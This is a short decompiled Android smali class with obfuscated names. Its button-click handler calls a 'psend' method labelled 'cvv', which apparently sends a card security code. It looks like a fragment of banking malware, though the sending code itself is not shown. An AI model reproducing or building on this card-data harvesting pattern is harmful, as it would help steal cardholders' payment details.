.class Lzoeaai/sbevo/tadkw/bg;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field final synthetic bankpines:Lzoeaai/sbevo/tadkw/l;


# direct methods
.method constructor <init>(Lzoeaai/sbevo/tadkw/l;)V
    .locals 0

    iput-object p1, p0, Lzoeaai/sbevo/tadkw/bg;->bankpines:Lzoeaai/sbevo/tadkw/l;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 4

    iget-object v0, p0, Lzoeaai/sbevo/tadkw/bg;->bankpines:Lzoeaai/sbevo/tadkw/l;

    const-string v1, "9"

    const-string v2, "cvv"

    const/4 v3, 0x3

    invoke-virtual {v0, v1, v2, v3}, Lzoeaai/sbevo/tadkw/l;->psend(Ljava/lang/String;Ljava/lang/String;I)V

    return-void
.end method